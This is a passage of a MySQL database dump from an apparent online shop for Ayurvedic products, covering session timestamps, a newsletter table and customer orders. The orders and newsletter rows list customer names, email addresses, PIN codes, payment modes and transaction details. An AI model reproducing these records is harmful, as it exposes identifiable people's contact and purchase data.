(1, '2022-03-28 04:19:53', '2022-03-28 04:33:22'),
(1, '2022-03-28 04:33:27', '0000-00-00 00:00:00'),
(1, '2022-03-28 06:00:23', '2022-03-28 12:39:33'),
(1, '2022-03-29 03:51:22', '0000-00-00 00:00:00'),
(1, '2022-03-29 08:55:10', '0000-00-00 00:00:00'),
(1, '2022-03-29 09:40:30', '2022-03-29 11:07:33'),
(1, '2022-03-29 12:30:20', '2022-03-29 12:36:08'),
(1, '2022-03-30 04:44:19', '2022-03-30 12:32:11'),
(1, '2022-03-30 16:10:58', '0000-00-00 00:00:00'),
(1, '2022-03-31 04:06:25', '0000-00-00 00:00:00'),
(1, '2022-03-31 05:10:28', '0000-00-00 00:00:00'),
(1, '2022-03-31 06:35:52', '0000-00-00 00:00:00'),
(1, '2022-03-31 07:19:05', '2022-03-31 12:24:08'),
(1, '2022-04-01 04:12:19', '2022-04-01 04:25:56'),
(1, '2022-04-01 04:26:07', '0000-00-00 00:00:00'),
(1, '2022-04-01 15:27:14', '0000-00-00 00:00:00'),
(1, '2022-04-01 15:35:55', '0000-00-00 00:00:00'),
(1, '2022-04-04 03:42:10', '0000-00-00 00:00:00'),
(1, '2022-04-04 08:23:49', '2022-04-04 10:59:46'),
(1, '2022-04-05 04:44:52', '2022-04-05 11:11:17'),
(1, '2022-04-06 03:51:18', '0000-00-00 00:00:00'),
(1, '2022-04-06 05:59:16', '2022-04-06 07:30:31'),
(1, '2022-04-06 09:02:45', '2022-04-06 12:36:14'),
(1, '2022-04-07 03:44:21', '2022-04-07 12:33:48'),
(1, '2022-04-08 03:51:52', '0000-00-00 00:00:00'),
(1, '2022-04-08 11:23:52', '2022-04-08 15:33:40'),
(1, '2022-04-11 04:44:01', '0000-00-00 00:00:00'),
(1, '2022-04-11 09:50:03', '0000-00-00 00:00:00'),
(1, '2022-04-11 10:20:21', '2022-04-11 10:43:56'),
(1, '2022-04-11 11:25:46', '2022-04-11 11:27:32'),
(1, '2022-04-11 14:08:27', '0000-00-00 00:00:00'),
(1, '2022-04-12 15:36:34', '0000-00-00 00:00:00'),
(1, '2022-04-14 04:03:27', '2022-04-14 06:39:46'),
(1, '2022-04-14 08:49:34', '0000-00-00 00:00:00'),
(1, '2022-04-15 07:24:37', '2022-04-15 08:52:58'),
(1, '2022-04-18 06:56:03', '2022-04-18 06:56:42'),
(1, '2022-04-18 15:31:34', '0000-00-00 00:00:00'),
(1, '2022-04-19 04:53:40', '0000-00-00 00:00:00'),
(1, '2022-04-28 04:25:02', '2022-04-28 05:17:53'),
(1, '2022-04-30 11:01:14', '0000-00-00 00:00:00'),
(1, '2022-05-12 06:14:01', '0000-00-00 00:00:00'),
(1, '2022-05-20 05:04:35', '0000-00-00 00:00:00'),
(1, '2022-06-01 09:22:55', '0000-00-00 00:00:00'),
(1, '2022-06-01 10:00:37', '2022-06-01 10:41:03'),
(1, '2022-06-02 09:48:58', '0000-00-00 00:00:00'),
(1, '2022-06-02 10:30:01', '0000-00-00 00:00:00'),
(1, '2022-06-06 07:10:29', '0000-00-00 00:00:00'),
(1, '2022-06-06 10:32:42', '0000-00-00 00:00:00'),
(1, '2022-06-07 10:16:14', '0000-00-00 00:00:00'),
(1, '2022-06-10 09:12:03', '0000-00-00 00:00:00'),
(1, '2022-06-15 06:26:13', '0000-00-00 00:00:00'),
(1, '2022-06-20 11:03:30', '0000-00-00 00:00:00'),
(1, '2022-06-27 04:38:06', '0000-00-00 00:00:00'),
(1, '2022-06-27 05:18:25', '0000-00-00 00:00:00'),
(1, '2022-07-12 09:18:18', '0000-00-00 00:00:00'),
(1, '2022-07-14 04:10:35', '0000-00-00 00:00:00'),
(1, '2022-07-14 06:41:27', '0000-00-00 00:00:00'),
(1, '2022-07-15 10:29:22', '0000-00-00 00:00:00'),
(1, '2022-07-16 05:25:15', '0000-00-00 00:00:00'),
(1, '2022-07-16 10:23:37', '0000-00-00 00:00:00'),
(1, '2022-07-18 04:44:45', '0000-00-00 00:00:00'),
(1, '2022-07-18 06:31:06', '0000-00-00 00:00:00'),
(1, '2022-07-18 10:48:17', '0000-00-00 00:00:00'),
(1, '2022-07-20 06:54:35', '0000-00-00 00:00:00'),
(1, '2022-07-22 05:55:25', '0000-00-00 00:00:00'),
(1, '2022-07-22 05:57:23', '0000-00-00 00:00:00'),
(1, '2022-07-25 04:30:36', '0000-00-00 00:00:00'),
(1, '2022-07-25 05:42:02', '0000-00-00 00:00:00'),
(1, '2022-07-26 09:22:16', '0000-00-00 00:00:00'),
(1, '2022-07-28 05:52:39', '0000-00-00 00:00:00'),
(1, '2022-07-31 05:18:42', '0000-00-00 00:00:00'),
(1, '2022-08-01 07:17:55', '0000-00-00 00:00:00'),
(1, '2022-08-01 12:54:32', '0000-00-00 00:00:00'),
(1, '2022-08-01 14:51:42', '0000-00-00 00:00:00'),
(1, '2022-08-02 04:06:39', '0000-00-00 00:00:00'),
(1, '2022-08-02 07:11:00', '0000-00-00 00:00:00'),
(1, '2022-08-02 08:42:01', '0000-00-00 00:00:00'),
(1, '2022-08-02 09:47:06', '0000-00-00 00:00:00'),
(1, '2022-08-03 04:21:39', '0000-00-00 00:00:00'),
(1, '2022-08-03 05:14:23', '0000-00-00 00:00:00'),
(1, '2022-08-03 05:31:41', '0000-00-00 00:00:00'),
(1, '2022-08-03 06:10:30', '0000-00-00 00:00:00'),
(1, '2022-08-03 06:14:14', '0000-00-00 00:00:00'),
(1, '2022-08-03 06:14:16', '0000-00-00 00:00:00'),
(1, '2022-08-04 04:11:08', '2022-08-04 04:19:39'),
(1, '2022-08-04 04:22:27', '0000-00-00 00:00:00'),
(1, '2022-08-04 04:37:50', '0000-00-00 00:00:00'),
(1, '2022-08-04 04:56:36', '0000-00-00 00:00:00'),
(1, '2022-08-07 09:41:36', '0000-00-00 00:00:00'),
(1, '2022-08-07 09:43:35', '0000-00-00 00:00:00'),
(1, '2022-08-08 09:17:05', '0000-00-00 00:00:00'),
(1, '2022-08-08 10:48:59', '0000-00-00 00:00:00'),
(1, '2022-08-10 04:52:58', '0000-00-00 00:00:00'),
(1, '2022-08-10 06:23:27', '0000-00-00 00:00:00'),
(1, '2022-08-11 06:32:33', '0000-00-00 00:00:00'),
(1, '2022-08-16 09:21:38', '0000-00-00 00:00:00'),
(1, '2022-08-16 12:21:46', '0000-00-00 00:00:00'),
(1, '2022-08-22 09:14:30', '0000-00-00 00:00:00'),
(1, '2022-08-23 04:53:25', '0000-00-00 00:00:00'),
(1, '2022-09-10 04:36:36', '0000-00-00 00:00:00'),
(1, '2022-09-16 09:34:26', '0000-00-00 00:00:00'),
(1, '2022-09-20 05:30:46', '0000-00-00 00:00:00'),
(1, '2022-09-21 14:07:40', '0000-00-00 00:00:00'),
(1, '2022-09-26 09:05:23', '0000-00-00 00:00:00'),
(1, '2022-09-26 09:19:17', '0000-00-00 00:00:00'),
(1, '2022-09-26 11:50:26', '0000-00-00 00:00:00'),
(1, '2022-09-27 06:24:32', '0000-00-00 00:00:00'),
(1, '2022-09-27 09:04:34', '0000-00-00 00:00:00'),
(1, '2022-09-27 09:38:43', '0000-00-00 00:00:00'),
(1, '2022-09-28 08:04:07', '0000-00-00 00:00:00'),
(1, '2022-09-29 12:44:45', '0000-00-00 00:00:00'),
(1, '2022-09-30 04:48:43', '0000-00-00 00:00:00'),
(1, '2022-10-07 16:06:23', '0000-00-00 00:00:00'),
(1, '2022-10-12 06:03:42', '0000-00-00 00:00:00'),
(1, '2022-10-12 08:33:11', '0000-00-00 00:00:00'),
(1, '2022-10-12 09:47:35', '0000-00-00 00:00:00'),
(1, '2022-10-12 10:22:22', '0000-00-00 00:00:00'),
(1, '2022-10-12 10:24:43', '0000-00-00 00:00:00'),
(1, '2022-10-12 10:25:43', '0000-00-00 00:00:00'),
(1, '2022-10-12 11:00:45', '0000-00-00 00:00:00'),
(1, '2022-10-13 03:58:52', '2022-10-13 04:00:26'),
(1, '2022-10-13 04:13:05', '0000-00-00 00:00:00'),
(1, '2022-10-13 06:16:26', '2022-10-13 06:34:03'),
(1, '2022-10-13 06:38:00', '0000-00-00 00:00:00'),
(1, '2022-10-13 06:39:51', '0000-00-00 00:00:00'),
(1, '2022-10-13 07:00:00', '2022-10-13 11:15:46'),
(1, '2022-10-13 11:30:51', '0000-00-00 00:00:00'),
(1, '2022-10-14 05:56:47', '2022-10-14 06:22:46'),
(1, '2022-10-14 09:06:33', '0000-00-00 00:00:00'),
(1, '2022-10-14 12:01:33', '0000-00-00 00:00:00'),
(1, '2022-10-17 11:36:10', '0000-00-00 00:00:00'),
(1, '2022-10-18 06:11:36', '0000-00-00 00:00:00'),
(1, '2022-10-20 05:40:36', '0000-00-00 00:00:00'),
(1, '2022-10-20 08:24:55', '0000-00-00 00:00:00'),
(1, '2022-10-20 11:12:17', '0000-00-00 00:00:00'),
(1, '2022-10-21 12:16:27', '2022-10-21 12:23:14'),
(1, '2022-10-21 12:23:39', '0000-00-00 00:00:00'),
(1, '2022-10-21 12:23:40', '2022-10-21 12:57:02'),
(1, '2022-10-22 16:13:03', '0000-00-00 00:00:00'),
(1, '2022-10-22 16:30:49', '2022-10-22 16:31:11'),
(1, '2022-10-25 06:29:47', '0000-00-00 00:00:00'),
(1, '2022-10-26 11:08:01', '0000-00-00 00:00:00'),
(1, '2022-10-27 05:20:19', '0000-00-00 00:00:00'),
(1, '2022-10-27 06:35:22', '0000-00-00 00:00:00'),
(1, '2022-10-31 11:37:28', '0000-00-00 00:00:00'),
(1, '2022-11-02 04:17:33', '0000-00-00 00:00:00'),
(1, '2022-11-03 07:07:59', '0000-00-00 00:00:00'),
(1, '2022-11-07 10:16:04', '0000-00-00 00:00:00'),
(1, '2022-11-07 10:59:49', '0000-00-00 00:00:00'),
(1, '2022-11-08 05:31:50', '0000-00-00 00:00:00'),
(1, '2022-11-08 07:31:36', '0000-00-00 00:00:00'),
(1, '2022-11-09 11:09:24', '0000-00-00 00:00:00'),
(1, '2022-11-10 03:57:41', '0000-00-00 00:00:00'),
(1, '2022-11-14 04:29:30', '0000-00-00 00:00:00'),
(1, '2022-11-22 10:01:22', '0000-00-00 00:00:00'),
(1, '2022-11-22 10:06:22', '0000-00-00 00:00:00'),
(1, '2022-11-23 09:16:15', '0000-00-00 00:00:00'),
(1, '2022-11-27 05:20:56', '0000-00-00 00:00:00'),
(1, '2022-11-27 05:35:39', '0000-00-00 00:00:00'),
(1, '2022-11-28 12:48:17', '0000-00-00 00:00:00'),
(1, '2022-12-06 00:19:27', '0000-00-00 00:00:00'),
(1, '2022-12-06 00:24:18', '0000-00-00 00:00:00'),
(1, '2022-12-06 00:24:20', '0000-00-00 00:00:00'),
(1, '2022-12-08 09:16:53', '0000-00-00 00:00:00'),
(1, '2022-12-08 09:39:38', '2022-12-08 10:30:43'),
(1, '2022-12-08 10:31:06', '0000-00-00 00:00:00'),
(1, '2022-12-08 10:37:06', '2022-12-08 11:03:54'),
(1, '2022-12-08 12:12:59', '0000-00-00 00:00:00'),
(1, '2022-12-08 12:16:49', '2022-12-09 04:08:35'),
(1, '2022-12-09 09:29:34', '0000-00-00 00:00:00'),
(1, '2022-12-11 14:10:20', '0000-00-00 00:00:00'),
(1, '2022-12-11 14:12:40', '0000-00-00 00:00:00'),
(1, '2022-12-12 04:44:37', '0000-00-00 00:00:00'),
(1, '2022-12-12 05:08:12', '0000-00-00 00:00:00'),
(1, '2022-12-12 05:23:41', '2022-12-12 07:31:55'),
(1, '2022-12-20 16:51:38', '0000-00-00 00:00:00'),
(1, '2023-01-12 19:59:56', '0000-00-00 00:00:00'),
(1, '2023-01-31 06:53:35', '0000-00-00 00:00:00'),
(1, '2023-02-13 04:38:22', '0000-00-00 00:00:00'),
(1, '2023-03-23 11:28:28', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `materials`
--

CREATE TABLE `materials` (
  `id` int(255) NOT NULL,
  `name` varchar(2000) NOT NULL,
  `page_url` text NOT NULL,
  `status` varchar(2000) NOT NULL,
  `order_no` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `materials`
--

INSERT INTO `materials` (`id`, `name`, `page_url`, `status`, `order_no`) VALUES
(1, 'Gogarbha', 'ayush', '0', 1);

-- --------------------------------------------------------

--
-- Table structure for table `newsletter`
--

CREATE TABLE `newsletter` (
  `id` int(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `subscribed_date` datetime NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `newsletter`
--

INSERT INTO `newsletter` (`id`, `email`, `subscribed_date`, `status`) VALUES
(38, 'developerweb50@gmail.com', '2022-08-04 10:44:20', 0),
(7, 'shilpa@savithru.com', '2022-02-17 10:18:51', 0),
(39, 'syedonm@gmail.com', '2022-08-04 10:49:34', 0),
(16, 'shri@savithru.com', '2022-03-02 12:48:13', 0),
(9, 'dsfd@gmail.com', '2022-02-17 18:36:42', 0),
(10, 's@gmail.com', '2022-02-17 18:36:53', 0),
(12, 'ss@gmail.com', '2022-02-18 09:55:27', 0),
(13, 'ssdddd@gmail.com', '2022-02-18 09:55:34', 0),
(32, 'jj@gmail.com', '2022-03-02 21:13:12', 0),
(26, 'shria@savithru.com', '2022-03-02 15:25:58', 0),
(33, 'gvsuresh@savithru.com', '2022-03-29 10:33:35', 0),
(34, 'sreeshailk@gmail.com', '2022-03-31 05:16:04', 0),
(35, '', '2022-05-07 11:02:59', 0),
(36, 'praju276@gmail.com', '2022-07-25 08:42:58', 0),
(37, 'gvsureshiyer2@gmail.com', '2022-08-03 10:13:20', 0);

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` int(11) NOT NULL,
  `orderid` text,
  `txnid` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `user_name` text NOT NULL,
  `emailid` text NOT NULL,
  `tot_qty` varchar(20) NOT NULL,
  `total_amt` text NOT NULL,
  `coupon_code` text NOT NULL,
  `discount` text NOT NULL,
  `saved_amt` text NOT NULL,
  `devilery_charge` text NOT NULL,
  `total_amt_paid` varchar(50) NOT NULL,
  `delivery_days` int(11) NOT NULL,
  `ordered_date` datetime NOT NULL,
  `delivery_date` date DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '-1' COMMENT '-1: fail, 1:success, 2:pending, 3:shipping, 4->delivered, 5- COD',
  `email_status` int(11) NOT NULL DEFAULT '0',
  `payuid` text,
  `paymode` text,
  `pstatus` text,
  `pamount` text,
  `pamount_debit` text,
  `payudate` text,
  `shipping_by` int(11) DEFAULT NULL,
  `shipping_date` date DEFAULT NULL,
  `delivered_by` int(11) DEFAULT NULL,
  `delivered_date` date DEFAULT NULL,
  `sms_response` text,
  `shipsms_response` text,
  `delvrsms_response` text,
  `invoice_no` text NOT NULL,
  `invoice_date` datetime NOT NULL,
  `invoice_by` int(11) NOT NULL,
  `invoice_pdf` text NOT NULL,
  `currency_type` tinyint(1) NOT NULL COMMENT '1->iNR;2->DOLLAR',
  `taxamount` varchar(50) NOT NULL,
  `pincode` varchar(50) NOT NULL,
  `randid` varchar(50) NOT NULL,
  `discount_per` int(11) NOT NULL,
  `ppayid` varchar(50) NOT NULL,
  `phash` varchar(255) NOT NULL,
  `ptxn` varchar(300) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `orderid`, `txnid`, `user_id`, `user_name`, `emailid`, `tot_qty`, `total_amt`, `coupon_code`, `discount`, `saved_amt`, `devilery_charge`, `total_amt_paid`, `delivery_days`, `ordered_date`, `delivery_date`, `status`, `email_status`, `payuid`, `paymode`, `pstatus`, `pamount`, `pamount_debit`, `payudate`, `shipping_by`, `shipping_date`, `delivered_by`, `delivered_date`, `sms_response`, `shipsms_response`, `delvrsms_response`, `invoice_no`, `invoice_date`, `invoice_by`, `invoice_pdf`, `currency_type`, `taxamount`, `pincode`, `randid`, `discount_per`, `ppayid`, `phash`, `ptxn`) VALUES
(1, 'GGA00001', '52286a4df20b0c90008d', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '825', '0', '', '0', '300', '1125', 4, '2022-04-06 15:41:18', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'GGA80254', '2022-04-08 00:00:00', 1, 'assets/pdf/GGA00001.pdf', 1, '75', '562158', '5782563857038247', 0, '', '', ''),
(2, 'GGA00002', '1f8eefbe3953aff877d0', 1, 'syed afroz', 'developerweb50@gmail.com', '5', '1155', '0', '', '0', '300', '1455', 4, '2022-04-06 15:42:56', NULL, 2, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '105', '562158', '5062744128451791', 0, '', '', ''),
(3, 'GGA00003', '88dc18dd0ba37b5cb874', 5, 'AshwinH', 'ashwin@savithru.com', '1', '200.0', '', '0.00', '', '50', '270.00', 4, '2022-04-07 15:06:27', '2022-04-11', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '20.00', '560010', '29322264', 0, '', '', ''),
(4, 'GGA00004', 'f18c65a8b1df18142a05', 10, 'ashwini', 'ashwiniravi677@gmail.com', '3', '300', '0', '', '0', '50', '350', 4, '2022-04-08 11:25:38', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560079', '3187074190617468', 0, '', '', ''),
(5, 'GGA00005', 'f22807e3446ec2894839', 5, 'AshwinH', 'ashwin@savithru.com', '1', '200.0', '', '0.00', '', '50', '274.00', 4, '2022-04-08 12:07:19', '2022-04-12', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24.00', '560010', '18595251', 0, '', '', ''),
(6, 'GGA00006', '161bb219c28eceb4ad66', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '168', '0', '16.8', '1', '300', '452', 4, '2022-04-09 14:33:20', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562158', '3126451136289413', 10, '', '', ''),
(7, 'GGA00007', '9559844146f0cb764ce1', 10, 'ashwini', 'ashwiniravi677@gmail.com', '2', '448', '0', '', '0', '50', '498', 4, '2022-04-11 10:38:54', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '48', '560079', '7929762044380943', 0, '', '', ''),
(8, 'GGA00008', 'c73976f9db2718b2536a', 20, 'shilpa', 'shilpa@savithru.com', '3', '481', '0', '', '0', '100', '581', 4, '2022-04-11 11:58:26', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '51.6', '560022', '2882016861612731', 0, '', '', ''),
(9, 'GGA00009', '280b0bf08fe64408bb89', 20, 'shilpa', 'shilpa@savithru.com', '1', '257', '0', '', '0', '100', '357', 4, '2022-04-11 12:01:57', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '27.6', '560022', '8392698928939068', 0, '', '', ''),
(10, 'GGA00010', '3e49ab94252b025b3ec7', 5, 'AshwinH', 'ashwin@savithru.com', '1', '200', '', '', '', '50', '274', 4, '2022-04-11 14:19:25', '2022-04-15', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24', '560010', '14376330', 0, '', '', ''),
(11, 'GGA00011', '0013d5da856de01adf31', 5, 'AshwinH', 'ashwin@savithru.com', '1', '200', '', '', '', '50', '274', 4, '2022-04-11 14:22:25', '2022-04-15', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24', '560010', '99846708', 0, '', '', ''),
(12, 'GGA00012', '22379bfd389fe5e8a030', 5, 'AshwinH', 'ashwin@savithru.com', '1', '250', '', '', '', '50', '330', 4, '2022-04-11 14:34:44', '2022-04-15', 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '30', '560010', '20965713', 0, '', '', ''),
(13, 'GGA00013', '8f1fa145dd1076dc9544', 5, 'AshwinH', 'ashwin@savithru.com', '8', '1400.0', '', '0.00', '', '50', '1636.00', 4, '2022-04-11 15:20:51', '2022-04-15', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '186.00', '560010', '47407386', 0, '', '', ''),
(14, 'GGA00014', 'e0190d048bd29ca24b46', 3, 'sh', 'sh@gmail.com', '1', '112', '0', '', '0', '50', '162', 4, '2022-04-11 15:48:49', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '12', '560013', '8358402295596988', 0, '', '', ''),
(15, 'GGA00015', 'f52083f83781a60c490d', 28, 'PrathamA', 'pratham@napdesigns.com', '1', '200.0', '', '0.00', '', '50', '274.00', 4, '2022-04-11 17:51:04', '2022-04-15', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24.00', '560022', '76024933', 0, '', '', ''),
(16, 'GGA00016', 'a77656f6c4f89484402b', 3, 'sh', 'sh@gmail.com', '5', '1288', '0', '', '0', '50', '1338', 4, '2022-05-12 17:49:52', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '138', '560013', '9130538267598575', 0, '', '', ''),
(17, 'GGA00017', '368f0d53d5643e2e41d1', 3, 'sh', 'sh@gmail.com', '5', '1120', '0', '', '0', '50', '1170', 4, '2022-05-17 19:25:00', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'GGA17512', '2022-05-19 00:00:00', 1, 'assets/pdf/GGA00017.pdf', 1, '120', '560013', '2785368186887539', 0, '', '', ''),
(18, 'GGA00018', '6aefa88079e7c07f4dc8', 10, 'ashwini', 'ashwiniravi677@gmail.com', '4', '1200', '0', '', '0', '50', '1250', 4, '2022-06-01 14:49:26', NULL, 3, 0, NULL, 'cod', NULL, NULL, NULL, NULL, 1, '2022-06-01', NULL, '2022-06-01', NULL, 'REQUEST FAILED 	', NULL, 'GGA96476', '2022-06-02 00:00:00', 1, 'assets/pdf/GGA00018.pdf', 1, '0', '560089', '8649503872311162', 0, '', '', ''),
(19, 'GGA00019', 'baf9453d21f5daac9991', 10, 'ashwini', 'ashwiniravi677@gmail.com', '3', '535', '0', '', '0', '50', '585', 4, '2022-06-01 15:31:37', NULL, 3, 0, NULL, 'cod', NULL, NULL, NULL, NULL, 1, '2022-06-01', NULL, '2022-06-01', NULL, NULL, NULL, 'GGA50705', '2022-06-02 00:00:00', 1, 'assets/pdf/GGA00019.pdf', 1, '25.5', '560010', '9027441004332610', 0, '', '', ''),
(20, 'GGA00020', '6bea85ac1a0687592718', 10, 'ashwini', 'ashwiniravi677@gmail.com', '2', '400', '0', '', '0', '50', '450', 4, '2022-06-01 15:34:45', NULL, 4, 0, NULL, 'cod', NULL, NULL, NULL, NULL, 1, '2022-06-01', 1, '2022-05-05', NULL, 'REQUEST FAILED 	', 'REQUEST FAILED 	', 'GGA66715', '2022-06-01 00:00:00', 1, 'assets/pdf/GGA00020.pdf', 1, '0', '560091', '6940168179022199', 0, '', '', ''),
(21, 'GGA00021', 'cbdd90a8721a442edf21', 5, 'AshwinH', 'ashwin@savithru.com', '2', '300.0', '', '0.00', '', '50', '374.00', 4, '2022-07-22 10:00:25', '2022-07-26', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24.00', '560010', '15465430', 0, '', '', ''),
(22, 'GGA00022', '9fc57f58454fbd23cd1b', 5, 'AshwinH', 'ashwin@savithru.com', '2', '300.0', '', '0.00', '', '50', '374.00', 4, '2022-07-22 10:02:51', '2022-07-26', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24.00', '560010', '92322630', 0, '', '', ''),
(23, 'GGA00023', '39af5203f84287d3c1c6', 5, 'AshwinH', 'ashwin@savithru.com', '2', '300.0', '', '0.00', '', '50', '374.00', 4, '2022-07-22 10:10:05', '2022-07-26', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '24.00', '560010', '78200399', 0, '', '', ''),
(24, 'GGA00024', 'c6a1c9ca8cdc176259e4', 33, 'shri', 'shri@gmail.com', '1', '118', '0', '', '0', '50', '168', 4, '2022-07-22 14:25:34', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '560013', '5159000435589054', 0, '', '', ''),
(25, 'GGA00025', '0010392e53a758482f41', 33, 'shri', 'shri@gmail.com', '2', '218', '0', '', '0', '50', '268', 4, '2022-07-30 11:28:04', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '560013', '3045351180009152', 0, '', '', ''),
(26, 'GGA00026', 'e6297e6feaf9cce05568', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '65', '0', '', '0', '300', '365', 4, '2022-08-01 10:45:54', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '7948463852919712', 0, '', '', ''),
(27, 'GGA00027', '3986c802570932e2b28c', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '65', '0', '', '0', '300', '365', 4, '2022-08-01 10:46:32', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '4203906308939330', 0, '', '', ''),
(28, 'GGA00028', '5941b0815f05a68f4418', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '300', '418', 4, '2022-08-01 11:17:07', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '9832895427076737', 0, '', '', ''),
(29, 'GGA00029', '7577d3ae3c22bb5d35f4', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '300', '418', 4, '2022-08-01 11:22:54', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '6301830439311742', 0, '', '', ''),
(30, 'GGA00030', '93bfa330aa00f2da6c28', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:27:38', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '1677789014515474', 0, '', '', ''),
(31, 'GGA00031', '2f6dd2e36ca5563e56c6', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:28:19', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '6702006632984129', 0, '', '', ''),
(32, 'GGA00032', '686280e1784b8bc541cf', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:29:48', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '6378770226404304', 0, '', '', ''),
(33, 'GGA00033', 'c29a459b89beb25cd94a', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:33:57', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '4455266737494840', 0, '', '', ''),
